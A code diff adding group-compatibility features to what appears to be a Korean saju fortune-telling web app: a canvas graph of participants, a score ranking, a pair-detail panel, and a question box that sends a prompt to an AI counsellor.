+    ctx.fillStyle='rgba(255,248,245,.97)';ctx.fill();
+    ctx.strokeStyle='#ffd1dc';ctx.lineWidth=2;ctx.stroke();
+    ctx.fillStyle='#28180b';ctx.font='bold 10px sans-serif';
+    ctx.textAlign='center';ctx.textBaseline='middle';
+    ctx.fillText(p.name.length>4?p.name.slice(0,4)+'…':p.name,x,y);
+    ctx.fillStyle='#817476';ctx.font='8px sans-serif';ctx.textBaseline='top';
+    ctx.fillText(STEMS[p.data.day.stem]+BRANCHES[p.data.day.branch],x,y+28);
+  });
+  canvas.style.cursor='pointer';
+
+  // 클릭 이벤트
+  canvas.onclick=e=>{
+    const rect=canvas.getBoundingClientRect();
+    const mx=(e.clientX-rect.left)*(W/rect.width);
+    const my=(e.clientY-rect.top)*(H/rect.height);
+    for(let i=0;i<nodes.length;i++){
+      if(Math.hypot(mx-nodes[i].x,my-nodes[i].y)<30){
+        highlightNNode(i,pData,pairs,nodes,ctx,W,H);
+        const best=pairs.filter(p=>p.i===i||p.j===i).sort((a,b)=>b.score-a.score)[0];
+        if(best) selectNPair(best.i,best.j);
+        break;
+      }
+    }
+  };
+}
+
+function roundRect(ctx,x,y,w,h,r){
+  ctx.beginPath();ctx.moveTo(x+r,y);ctx.lineTo(x+w-r,y);ctx.arcTo(x+w,y,x+w,y+r,r);
+  ctx.lineTo(x+w,y+h-r);ctx.arcTo(x+w,y+h,x+w-r,y+h,r);ctx.lineTo(x+r,y+h);
+  ctx.arcTo(x,y+h,x,y+h-r,r);ctx.lineTo(x,y+r);ctx.arcTo(x,y,x+r,y,r);ctx.closePath();
+}
+
+function highlightNNode(selIdx,pData,pairs,nodes,ctx,W,H){
+  ctx.clearRect(0,0,W,H);
+  pairs.forEach(p=>{
+    const A=nodes[p.i],B=nodes[p.j];
+    const isC=p.i===selIdx||p.j===selIdx;
+    const{color}=scoreGradeN(p.score);
+    ctx.beginPath();ctx.moveTo(A.x,A.y);ctx.lineTo(B.x,B.y);
+    ctx.strokeStyle=isC?color:color+'22';ctx.lineWidth=isC?3:1;ctx.stroke();
+    if(isC){
+      const mx=(A.x+B.x)/2,my=(A.y+B.y)/2;const lbl=`${p.score}점`;
+      ctx.font='bold 10px sans-serif';const tw=ctx.measureText(lbl).width;
+      ctx.fillStyle='rgba(255,248,245,.95)';roundRect(ctx,mx-tw/2-5,my-8,tw+10,16,5);ctx.fill();
+      ctx.fillStyle=color;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText(lbl,mx,my);
+    }
+  });
+  pData.forEach((p,i)=>{
+    const{x,y}=nodes[i];
+    ctx.beginPath();ctx.arc(x,y,26,0,Math.PI*2);
+    ctx.fillStyle=i===selIdx?'#ffd1dc':'rgba(255,248,245,.97)';ctx.fill();
+    ctx.strokeStyle=i===selIdx?'#78555e':'#ffd1dc';ctx.lineWidth=i===selIdx?3:2;ctx.stroke();
+    ctx.fillStyle='#28180b';ctx.font='bold 10px sans-serif';ctx.textAlign='center';ctx.textBaseline='middle';
+    ctx.fillText(p.name.length>4?p.name.slice(0,4)+'…':p.name,x,y);
+    ctx.fillStyle='#817476';ctx.font='8px sans-serif';ctx.textBaseline='top';
+    ctx.fillText(STEMS[p.data.day.stem]+BRANCHES[p.data.day.branch],x,y+28);
+  });
+}
+
+// =====================================================
+// N:N 궁합 — 순위 렌더링
+// =====================================================
+function renderNRanking(pData,pairs){
+  const sorted=[...pairs].sort((a,b)=>b.score-a.score);
+  document.getElementById('nRanking').innerHTML=sorted.map((p,k)=>{
+    const{label,color}=scoreGradeN(p.score);
+    return `<div onclick="selectNPair(${p.i},${p.j})" style="display:flex;align-items:center;gap:10px;padding:9px 6px;border-bottom:1px solid var(--border);cursor:pointer;border-radius:8px" onmouseover="this.style.background='var(--peach3)'" onmouseout="this.style.background=''">
+      <div style="font-size:13px;font-weight:800;color:var(--text3);width:18px">${k+1}</div>
+      <div style="flex:1;font-size:12px;font-weight:700">${pData[p.i].name} ↔ ${pData[p.j].name}</div>
+      <div style="font-size:15px;font-weight:800;color:${color}">${p.score}점</div>
+      <div style="font-size:10px;padding:2px 9px;border-radius:20px;background:${color}22;color:${color};font-weight:700">${label}</div>
+    </div>`;
+  }).join('');
+}
+
+// =====================================================
+// N:N 궁합 — 쌍 선택
+// =====================================================
+function selectNPair(i,j){
+  if(!_nPData||!_nPairs)return;
+  const pair=_nPairs.find(p=>(p.i===i&&p.j===j)||(p.i===j&&p.j===i));if(!pair)return;
+  _nPairSel={i,j,p1:_nPData[i],p2:_nPData[j],pair};
+  const{score,rel}=pair;const{label,color}=scoreGradeN(score);
+  const REL=['상극 ⚡','상생 🌱','비화 🤝','상생(받는) 🌸','상극(받는) ⚡'];
+  document.getElementById('nPairContent').innerHTML=`
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+      <div style="font-family:'Nanum Myeongjo',serif;font-size:15px;font-weight:800">${_nPData[i].name} ↔ ${_nPData[j].name}</div>
+      <div style="font-family:'Nanum Myeongjo',serif;font-size:22px;font-weight:800;color:${color}">${score}점</div>
+    </div>
+    <div style="font-size:12px;font-weight:700;color:${color};margin-bottom:8px">${label}</div>
+    <div style="height:8px;background:var(--bg3);border-radius:20px;overflow:hidden;margin-bottom:8px">
+      <div style="height:100%;width:${score}%;background:${color};border-radius:20px;transition:width 1s ease"></div>
+    </div>
+    <div style="font-size:11px;color:var(--text2)">일간 상성: <strong>${REL[rel]||''}</strong></div>`;
+  document.getElementById('nPairDetail').style.display='block';
+  setTimeout(()=>document.getElementById('nPairDetail').scrollIntoView({behavior:'smooth',block:'nearest'}),100);
+}
+
+// =====================================================
+// N:N 궁합 상담
+// =====================================================
+async function askNQ(){
+  if(!_nPairSel){alert('그래프에서 이름을 클릭하거나 순위를 눌러 두 사람을 선택해주세요!');return;}
+  const q=(document.getElementById('nqInput')||{}).value?.trim();
+  if(!q){alert('질문을 입력해주세요 💕');return;}
+  const btn=document.getElementById('nqBtn');if(btn){btn.disabled=true;btn.textContent='💕 생성 중...';}
+  const box=document.getElementById('nqnaBox');
+  const qb=document.createElement('div');
+  qb.style.cssText='background:var(--peach3);border-radius:12px 12px 4px 12px;padding:10px 13px;font-size:12px;color:var(--text2);text-align:right;word-break:keep-all;margin-left:20px;margin-bottom:8px';
+  qb.innerHTML='<div style="font-size:10px;font-weight:700;color:var(--rose);margin-bottom:3px">나의 질문</div>'+escHtml(q);
+  box.appendChild(qb);
+  const ab=document.createElement('div');ab.className='a-bubble';
+  ab.innerHTML='<span class="a-label">✦ AI 명리 에이전트</span><div class="typing-dots"><span></span><span></span><span></span></div>';
+  box.appendChild(ab);ab.scrollIntoView({behavior:'smooth',block:'end'});
+  const{p1,p2,pair}=_nPairSel;
+  const REL=['상극','상생','비화','상생(받는)','상극(받는)'];
+  const prompt=`당신은 40년 경력의 명리학 대가.
+${p1.name}: 일주 ${STEMS[p1.data.day.stem]}${BRANCHES[p1.data.day.branch]} / 오행 목${p1.data.cnt[0]}화${p1.data.cnt[1]}토${p1.data.cnt[2]}금${p1.data.cnt[3]}수${p1.data.cnt[4]}
+${p2.name}: 일주 ${STEMS[p2.data.day.stem]}${BRANCHES[p2.data.day.branch]} / 오행 목${p2.data.cnt[0]}화${p2.data.cnt[1]}토${p2.data.cnt[2]}금${p2.data.cnt[3]}수${p2.data.cnt[4]}
+궁합점수: ${pair.score}점 / 상성: ${REL[pair.rel]||''}
+[질문] ${q}
+인사말 없이 본론, 명리학 근거, 자연스럽게 완결, 마지막은 조언.`;
+  const ans=await callGeminiSafe(prompt,2048);
+  const cd=document.createElement('div');cd.style.cssText='white-space:pre-wrap;overflow-wrap:break-word;word-break:keep-all';cd.textContent=ans||'일시적 오류. 잠시 후 다시 시도해주세요.';
+  ab.innerHTML='';const lbl=document.createElement('span');lbl.className='a-label';lbl.textContent='✦ AI 명리 에이전트';
+  ab.appendChild(lbl);ab.appendChild(cd);
+  if(btn){btn.disabled=false;btn.textContent='💕 상담받기';}
+  const inp=document.getElementById('nqInput');if(inp)inp.value='';
+  setTimeout(()=>ab.scrollIntoView({behavior:'smooth',block:'end'}),100);
+}
+
+function _snd(){
+  if(!_nPData||!_nPairs)return;
+  const sorted=[..._nPairs].sort((a,b)=>b.score-a.score);
+  _sd(`🧩 **그룹 궁합 공유** 🧩\n참여자: ${_nPData.map(p=>p.name).join(', ')}\n\n🏆 TOP ${Math.min(3,sorted.length)}:\n${sorted.slice(0,3).map((p,k)=>`${k+1}위 ${_nPData[p.i].name}↔${_nPData[p.j].name}: **${p.score}점** — ${scoreGradeN(p.score).label}`).join('\n')}`);
+  
+}
+
+function _ev(p){_px(p);}
 </script>
 </body>
 </html>
